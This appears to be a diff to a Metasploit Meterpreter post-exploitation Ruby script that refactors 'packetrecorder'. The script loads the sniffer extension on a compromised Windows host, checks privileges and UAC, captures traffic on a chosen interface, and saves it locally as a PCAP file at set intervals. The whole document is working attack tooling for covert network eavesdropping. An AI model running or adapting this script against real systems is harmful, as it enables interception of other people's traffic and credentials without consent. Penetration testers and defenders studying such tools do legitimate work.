@@ -1,60 +1,108 @@
 # $Id$
 # $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
-session = client
-#Get Hostname
-host,port = session.tunnel_peer.split(':')
-# Create Filename info to be appended to downloaded files
-filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
-# Create a directory for the logs
-logs = ::File.join(Msf::Config.log_directory, 'scripts', 'packetrecorder')
-# Create the log directory
-::FileUtils.mkdir_p(logs)
-#logfile name
-logfile = logs + ::File::Separator + host + filenameinfo + ".cap"
-#Interval for collecting Packets in seconds
-packtime = 30
-#Get user
-user = session.sys.config.getuid
+#-------------------------------------------------------------------------------
+################## Variable Declarations ##################
 
-@@exec_opts = Rex::Parser::Arguments.new(
-	"-h"  => [ false,  "Help menu."],
+@client = client
+
+# Interval for recording packets
+rec_time = 30
+
+# Interface ID
+int_id = nil
+
+# List Interfaces
+list_int = nil
+
+# Log Folder
+log_dest = nil
+@exec_opts = Rex::Parser::Arguments.new(
+	"-h"  => [ false, "Help menu."],
 	"-t"  => [ true,  "Time interval in seconds between recollection of packet, default 30 seconds."],
-	"-i"  => [ true,  "Interface ID number where all packet capture will be done."]
-	#"-b"  => [ false, "Background session after starting the recording of packets."]
+	"-i"  => [ true,  "Interface ID number where all packet capture will be done."],
+	"-li" => [ false, "List interfaces that can be used for capture."],
+	"-l"  => [ true,  "Specify and alternate folder to save PCAP file."]
 )
+meter_type = client.platform
+
+################## Function Declarations ##################
+
+# Usage Message Function
+#-------------------------------------------------------------------------------
+def usage
+	print_line "Meterpreter Script for capturing packets in to a PCAP file"
+	print_line "on a target host given a interface ID."
+	print_line(@exec_opts.usage)
+	raise Rex::Script::Completed
+end
+
+# Wrong Meterpreter Version Message Function
+#-------------------------------------------------------------------------------
+def wrong_meter_version(meter = meter_type)
+	print_error("#{meter} version of Meterpreter is not supported with this Script!")
+	raise Rex::Script::Completed
+end
+
+# Function for creating log folder and returning log pa
+#-------------------------------------------------------------------------------
+def log_file(log_path = nil)
+	#Get hostname
+	host = @client.sys.config.sysinfo["Computer"]
+
+	# Create Filename info to be appended to downloaded files
+	filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+
+	# Create a directory for the logs
+	if log_path
+		logs = ::File.join(log_path, 'logs', 'packetrecorder', host + filenameinfo )
+	else
+		logs = ::File.join(Msf::Config.log_directory, "scripts", 'packetrecorder', host + filenameinfo )
+	end
+
+	# Create the log directory
+	::FileUtils.mkdir_p(logs)
+
+	#logfile name
+	logfile = logs + ::File::Separator + host + filenameinfo + ".cap"
+	return logfile
+end
 
 #Function for Starting Capture
-def startsniff(session,intid)
+#-------------------------------------------------------------------------------
+def startsniff(interface_id)
 	begin
 		#Load Sniffer module
-		session.core.use("sniffer")
-		print_status("Starting Packet capture on interface #{intid}")
+		@client.core.use("sniffer")
+		print_status("Starting Packet capture on interface #{interface_id}")
 		#starting packet capture with a buffer size of 200,000 packets
-		session.sniffer.capture_start(intid, 200000)
-		print_status("Packet capture started")
+		@client.sniffer.capture_start(interface_id, 200000)
+		print_good("Packet capture started")
 	rescue ::Exception => e
 		print_status("Error Starting Packet Capture: #{e.class} #{e}")
+		raise Rex::Script::Completed
 	end
 end
 
 #Function for Recording captured packets into PCAP file
-def packetrecord(session, packtime, logfile,intid)
+#-------------------------------------------------------------------------------
+def packetrecord(packtime, logfile,intid)
 	begin
 		rec = 1
 		print_status("Packets being saved in to #{logfile}")
+		print_status("Packet capture interval is #{packtime} Seconds")
 		#Inserting Packets every number of seconds specified
 		while rec == 1
 			path_cap = logfile
 			path_raw = logfile + '.raw'
 			fd = ::File.new(path_raw, 'wb+')
 			#Flushing Buffers
-			res = session.sniffer.capture_dump(intid)
+			res = @client.sniffer.capture_dump(intid)
 			bytes_all = res[:bytes] || 0
 			bytes_got = 0
 			bytes_pct = 0
 			while (bytes_all > 0)
-				res = session.sniffer.capture_dump_read(intid,1024*512)
+				res = @client.sniffer.capture_dump_read(intid,1024*512)
 				bytes_got += res[:bytes]
 				pct = ((bytes_got.to_f / bytes_all.to_f) * 100).to_i
 				if(pct > bytes_pct)
@@ -73,7 +121,6 @@ def packetrecord(session, packtime, logfile,intid)
 				fd = ::File.new(path_cap, 'wb+')
 				fd.write([0xa1b2c3d4, 2, 4, 0, 0, 65536, 1].pack('NnnNNNN'))
 			end
-			pkts = {}
 			od = ::File.new(path_raw, 'rb')
 
 			# TODO: reorder packets based on the ID (only an issue if the buffer wraps)
@@ -88,7 +135,6 @@ def packetrecord(session, packtime, logfile,intid)
 					break
 				end
 
-				pkt_id = (idh << 32) +idl
 				pkt_ts = Rex::Proto::SMB::Utils.time_smb_to_unix(thi,tlo)
 				pkt    = od.read(len)
 				fd.write([pkt_ts,0,len,len].pack('NNNN')+pkt)
@@ -104,76 +150,55 @@ def packetrecord(session, packtime, logfile,intid)
 	rescue::Exception => e
 		print("\n")
 		print_status("#{e.class} #{e}")
-		print_status("Stopping Packet sniffer...")
-		session.sniffer.capture_stop(intid)
+		print_good("Stopping Packet sniffer...")
+		@client.sniffer.capture_stop(intid)
 	end
 end
-#ion for Checking for UAC
-def checkuac(session)
-	uac = false
-	begin
-		winversion = session.sys.config.sysinfo
-		if winversion['OS']=~ /Windows Vista/ or  winversion['OS']=~ /Windows 7/
-			print_status("Checking if UAC is enabled ...")
-			key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
-			root_key, base_key = session.sys.registry.splitkey(key)
-			value = "EnableLUA"
-			open_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
-			v = open_key.query_value(value)
-			if v.data == 1
-				uac = true
-			else
-				uac = false
-			end
-			open_key.close_key(key)
-		end
-	rescue ::Exception => e
-		print_status("Error Checking UAC: #{e.class} #{e}")
-	end
-	return uac
-end
-def helpmsg
-		print(
-				"Packet Recorder Meterpreter Script\n" +
-				  "This script will start the Meterpreter Sniffer and save all packets\n" +
-				  "in a PCAP file for later analysis. To stop capture hit Ctrl-C\n" +
-				  "Usage:" +
-				  @@exec_opts.usage
-		)
 
+# Function for listing interfaces
+# ------------------------------------------------------------------------------
+def int_list()
+	@client.core.use("sniffer")
+	ifaces = @client.sniffer.interfaces()
+
+	print_line()
+
+	ifaces.each do |i|
+		print_line(sprintf("%d - '%s' ( type:%d mtu:%d usable:%s dhcp:%s wifi:%s )",
+				i['idx'], i['description'],
+				i['type'], i['mtu'], i['usable'], i['dhcp'], i['wireless'])
+		)
+	end
+
+	print_line()
+	raise Rex::Script::Completed
 end
-# Parsing of Options
-helpcall = 0
-intid = 0
-background = 0
-if client.platform =~ /win32|win64/
-	@@exec_opts.parse(args) { |opt, idx, val|
-		case opt
-		when "-t"
-			packtime = val
-		when "-i"
-			intid = val.to_i
-		when "-h"
-			helpmsg
-			helpcall = 1
-		end
-	}
-	if helpcall == 0
-		if (user != "NT AUTHORITY\\SYSTEM") && intid != 0
-			if not checkuac(session)
-				startsniff(session,intid)
-				packetrecord(session,packtime,logfile,intid)
-			else
-				print_line("[-] The Meterpreter process is not running as System and UAC is not enable, Insufficient Privileges to run")
-			end
-		elsif intid != 0
-			startsniff(session,intid)
-			packetrecord(session,packtime,logfile,intid)
-		else
-			helpmsg
-		end
+################## Main ##################
+@exec_opts.parse(args) { |opt, idx, val|
+	case opt
+	when "-h"
+		usage
+	when "-i"
+		int_id = val.to_i
+	when "-l"
+		log_dest = val
+	when "-li"
+		int_list
+	when "-t"
+		rec_time = val
+	end
+}
+
+# Check for Version of Meterpreter
+wrong_meter_version(meter_type) if meter_type !~ /win32|win64/i
+if !int_id.nil?
+	if not is_uac_enabled? or is_admin?
+		pcap_file = log_file(log_dest)
+		startsniff(int_id)
+		packetrecord(rec_time,pcap_file,int_id)
+	else
+		print_error("UAC or Access Denied")
 	end
 else
-	print_error("This version of Meterpreter is not supported with this Script!")
-	raise Rex::Script::Completed
+	usage
 end
